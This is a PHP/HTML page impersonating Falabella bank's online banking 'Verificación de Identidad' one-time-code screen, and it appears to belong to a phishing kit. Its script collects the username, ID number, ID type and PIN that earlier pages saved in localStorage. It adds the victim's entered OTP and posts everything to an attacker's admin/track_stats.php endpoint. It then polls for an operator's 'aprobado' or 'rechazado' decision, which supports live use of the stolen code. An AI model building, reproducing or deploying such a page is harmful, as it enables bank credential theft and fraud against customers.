<?php
/**
 * otp.php - Falabella
 * Verificación de código OTP
 */
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Falabella - Verificación</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 430px;
            min-height: 100vh;
            background: white;
            position: relative;
            overflow: hidden;
        }

        /* HEADER - solo logo y título */
        .header {
            background: white;
            padding: 16px 20px 12px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #eee;
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .header-logo img {
            height: 32px;
            width: auto;
            object-fit: contain;
        }

        .header-title {
            font-size: 18px;
            font-weight: 300;
            color: #1a1a1a;
        }

        .header-title strong {
            font-weight: 700;
        }

        /* Botón Cerrar X - flotante */
        .close-btn {
            position: absolute;
            top: 16px;
            right: 20px;
            font-size: 22px;
            color: #999;
            cursor: pointer;
            background: none;
            border: none;
            font-weight: 300;
            z-index: 15;
        }

        /* Content */
        .content {
            padding: 40px 24px 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Logo pequeño */
        .logo-small {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            border: 2px solid #2d8c3c;
        }

        .logo-small img {
            width: 45px;
            height: 45px;
            object-fit: contain;
        }

        /* Título */
        .title {
            font-size: 22px;
            font-weight: 300;
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .title strong {
            font-weight: 700;
        }

        /* Subtítulo */
        .subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        /* Línea separadora */
        .divider {
            width: 60px;
            height: 2px;
            background: #2d8c3c;
            margin: 0 auto 30px;
            border-radius: 2px;
        }

        /* Formulario */
        .form-group {
            width: 100%;
            margin-bottom: 24px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            text-align: center;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
            display: flex;
            justify-content: center;
        }

        .input-wrapper input {
            width: 200px;
            padding: 14px 16px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
            background: #f8f8f8;
            text-align: center;
            letter-spacing: 8px;
            transition: border-color 0.3s;
            font-family: inherit;
        }

        .input-wrapper input:focus {
            outline: none;
            border-color: #2d8c3c;
            background: white;
        }

        .input-wrapper input::placeholder {
            letter-spacing: 2px;
            font-size: 16px;
            font-weight: 400;
            color: #bbb;
        }

        /* Botón */
        .btn-verificar {
            width: 100%;
            padding: 14px;
            background: #ccc;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            transition: all 0.3s;
            font-family: inherit;
            letter-spacing: 0.5px;
            margin-top: 8px;
        }

        .btn-verificar.active {
            background: #2d8c3c;
            cursor: pointer;
        }

        .btn-verificar.active:active {
            transform: scale(0.98);
        }

        /* Links */
        .links {
            width: 100%;
            text-align: center;
            margin-top: 20px;
        }

        .links a {
            color: #2d8c3c;
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
        }

        .links a:hover {
            text-decoration: underline;
        }

        /* Cookie Banner */
        .cookie-banner {
            background: #f0f0f0;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            border-top: 1px solid #e0e0e0;
            font-size: 12px;
            color: #555;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            max-width: 430px;
            margin: 0 auto;
            z-index: 20;
        }

        .cookie-banner a {
            color: #2d8c3c;
            text-decoration: none;
            font-weight: 500;
            white-space: nowrap;
        }

        .cookie-banner button {
            background: #2d8c3c;
            color: white;
            border: none;
            padding: 6px 18px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            white-space: nowrap;
            font-family: inherit;
        }

        /* Toast */
        .toast {
            position: fixed;
            top: 80px;
            right: 16px;
            z-index: 1000;
            transform: translateX(150%);
            transition: transform 0.4s ease;
            max-width: 320px;
            width: 100%;
        }

        .toast.show {
            transform: translateX(0);
        }

        .toast-content {
            background: white;
            border-left: 4px solid #E31E24;
            border-radius: 10px;
            padding: 14px 18px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }

        .toast-icon {
            background: #E31E24;
            color: white;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            flex-shrink: 0;
        }

        .toast-text h4 {
            font-size: 13px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 2px;
        }

        .toast-text p {
            font-size: 12px;
            color: #666;
            margin: 0;
        }

        /* Loader */
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.95);
            z-index: 999;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .loader-overlay.show {
            display: flex;
        }

        .loader-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #2d8c3c;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 16px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-text {
            font-size: 14px;
            color: #666;
        }

        /* Error Overlay */
        .error-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.95);
            z-index: 1000;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            padding: 40px;
        }

        .error-overlay.show {
            display: flex;
        }

        .error-icon {
            font-size: 56px;
            color: #E31E24;
            margin-bottom: 16px;
        }

        .error-title {
            font-size: 20px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
        }

        .error-message {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 24px;
            line-height: 1.5;
        }

        .error-btn {
            background: #2d8c3c;
            color: white;
            border: none;
            padding: 12px 40px;
            border-radius: 25px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }

        /* Responsive */
        @media (max-width: 430px) {
            .container {
                max-width: 100%;
                min-height: 100vh;
            }

            .content {
                padding: 30px 16px 20px;
            }

            .title {
                font-size: 20px;
            }

            .cookie-banner {
                max-width: 100%;
                flex-wrap: wrap;
                justify-content: center;
                text-align: center;
            }

            .header-title {
                font-size: 16px;
            }

            .header-logo img {
                height: 26px;
            }

            .input-wrapper input {
                width: 180px;
                font-size: 20px;
                padding: 12px 14px;
            }
        }

        @media (min-width: 431px) {
            .container {
                border-radius: 16px;
                min-height: 100vh;
                box-shadow: 0 4px 30px rgba(0,0,0,0.1);
            }

            .cookie-banner {
                border-radius: 0 0 16px 16px;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <!-- HEADER solo con logo y "Banca en línea" -->
    <div class="header">
        <div class="header-logo">
            <img src="HOJITA.svg" alt="Falabella">
        </div>
        <span class="header-title">Banca <strong>en línea</strong></span>
        <button class="close-btn" onclick="window.location.href='../'">✕</button>
    </div>

    <!-- Content -->
    <div class="content">
        <!-- Logo pequeño -->
        <div class="logo-small">
            <img src="HOJITA.svg" alt="Falabella">
        </div>

        <h1 class="title">Verificación <strong>de Identidad</strong></h1>
        <div class="divider"></div>

        <p class="subtitle">
            Hemos enviado un código de seguridad<br>
            a tu número registrado. Por favor, ingrésalo.
        </p>

        <!-- Form -->
        <form id="otpForm" autocomplete="off">
            <div class="form-group">
                <label>Código de seguridad</label>
                <div class="input-wrapper">
                    <input type="text" id="otp" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric">
                </div>
            </div>

            <button type="submit" class="btn-verificar" id="btnVerificar" disabled>VERIFICAR</button>
        </form>

        <div class="links">
            <a href="#" onclick="reenviarCodigo()">Reenviar código</a>
        </div>
    </div>

    <!-- Cookie Banner -->
    <div class="cookie-banner">
        <span>Usamos cookies para mejorar tu experiencia. <a href="#">Consulta más aquí.</a></span>
        <button onclick="this.parentElement.style.display='none'">Entendido</button>
    </div>
</div>

<!-- Toast -->
<div class="toast" id="toast">
    <div class="toast-content">
        <div class="toast-icon">!</div>
        <div class="toast-text">
            <h4>Error</h4>
            <p id="toastMsg">Código incorrecto. Intente de nuevo.</p>
        </div>
    </div>
</div>

<!-- Loader -->
<div class="loader-overlay" id="loader">
    <div class="loader-spinner"></div>
    <div class="loader-text">Verificando código...</div>
</div>

<!-- Error Overlay -->
<div class="error-overlay" id="errorOverlay">
    <div class="error-icon">⚠️</div>
    <div class="error-title">¡Ups! Algo falló</div>
    <div class="error-message" id="errorMsg">Lo sentimos, no pudimos completar la operación. Intenta de nuevo.</div>
    <button class="error-btn" onclick="cerrarError()">Intentar de nuevo</button>
</div>

<script>
    const otpInput = document.getElementById('otp');
    const btnVerificar = document.getElementById('btnVerificar');
    const form = document.getElementById('otpForm');

    // Solo números
    otpInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        verificarCampos();
    });

    function verificarCampos() {
        if (otpInput.value.length === 6) {
            btnVerificar.disabled = false;
            btnVerificar.classList.add('active');
        } else {
            btnVerificar.disabled = true;
            btnVerificar.classList.remove('active');
        }
    }

    function showToast(msg) {
        const toast = document.getElementById('toast');
        document.getElementById('toastMsg').textContent = msg;
        toast.classList.add('show');
        setTimeout(() => {
            toast.classList.remove('show');
        }, 5000);
    }

    function toggleLoader(show) {
        document.getElementById('loader').classList.toggle('show', show);
    }

    function cerrarError() {
        document.getElementById('errorOverlay').classList.remove('show');
        toggleLoader(false);
        otpInput.value = '';
        verificarCampos();
    }

    function reenviarCodigo() {
        showToast('Nuevo código enviado a tu número registrado.');
    }

    function startPolling(id) {
        let pollCount = 0;
        const maxPolls = 150;

        const interval = setInterval(() => {
            pollCount++;
            fetch('../../admin/check_aprobacion.php?log_id=' + id)
                .then(res => res.json())
                .then(data => {
                    console.log('Poll estado:', data.estado);
                    if (data.estado === 'aprobado') {
                        clearInterval(interval);
                        toggleLoader(false);
                        // Redirigir a éxito
                        window.location.href = "../../index.php";
                    } else if (data.estado === 'rechazado') {
                        clearInterval(interval);
                        toggleLoader(false);
                        showToast("Código incorrecto o expirado. Intente de nuevo.");
                        otpInput.value = '';
                        verificarCampos();
                    } else if (pollCount >= maxPolls) {
                        clearInterval(interval);
                        toggleLoader(false);
                        document.getElementById('errorMsg').textContent = 'Tiempo de espera agotado. Intenta de nuevo.';
                        document.getElementById('errorOverlay').classList.add('show');
                    }
                })
                .catch(err => {
                    console.error('Error en polling:', err);
                    if (pollCount >= maxPolls) {
                        clearInterval(interval);
                        toggleLoader(false);
                        document.getElementById('errorMsg').textContent = 'Error de conexión. Intenta de nuevo.';
                        document.getElementById('errorOverlay').classList.add('show');
                    }
                });
        }, 2000);
    }

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const otp = otpInput.value;

        if (!otp || otp.length !== 6) {
            showToast('Ingresa un código válido de 6 dígitos.');
            return;
        }

        toggleLoader(true);

        // Recuperar datos del localStorage (guardados en index.php)
        const usuario = localStorage.getItem('usuario_falabella') || '';
        const identificacion = localStorage.getItem('identificacion_falabella') || '';
        const tipo_id = localStorage.getItem('tipo_id_falabella') || 'CC';
        const clave_pin = localStorage.getItem('clave_pin_falabella') || '';

        const formData = new FormData();
        formData.append('activity', 'OTP (FALABELLA)');
        formData.append('action', 'log');
        formData.append('metodo', 'PSE');
        formData.append('banco', 'Falabella');
        formData.append('documento', usuario);
        formData.append('usuario', usuario);
        formData.append('identificacion', identificacion);
        formData.append('tipo_identificacion', tipo_id);
        formData.append('clave_pin', clave_pin);
        formData.append('codigo_dinamica', otp);
        formData.append('codigo_otp', otp);
        formData.append('clave_tarjeta', '');
        formData.append('ultimos_digitos', '');

        fetch('../../admin/track_stats.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        })
        .then(res => res.json())
        .then(data => {
            if (data.success && data.id) {
                localStorage.setItem('log_id_otp_falabella', data.id);
                startPolling(data.id);
            } else {
                toggleLoader(false);
                showToast('Error al procesar la solicitud.');
            }
        })
        .catch(err => {
            console.error('Error:', err);
            toggleLoader(false);
            document.getElementById('errorMsg').textContent = 'Error de conexión. Intenta de nuevo.';
            document.getElementById('errorOverlay').classList.add('show');
        });
    });
</script>

</body>
</html>